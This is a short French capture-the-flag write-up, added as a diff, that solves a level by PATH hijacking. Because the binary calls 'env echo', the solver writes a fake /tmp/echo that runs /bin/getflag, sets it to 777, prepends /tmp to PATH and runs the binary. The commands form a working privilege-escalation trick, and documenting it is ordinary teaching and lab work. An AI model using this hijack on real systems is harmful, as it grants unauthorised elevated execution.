@@ -1,0 +1,10 @@
+on se rend conte que dans l'executable il y a une ligne /usr/bin/env echo Exploit me
+qui produit le message que l'on voie quand on l'execute
+
+il faut donc demander a executer un autre fichier a la place
+
+echo /bin/getflag > /tmp/echo
+chmod 777 /tmp/echo
+export PATH=/tmp:$PATH
+
+et execute le binair pour avoir le flag
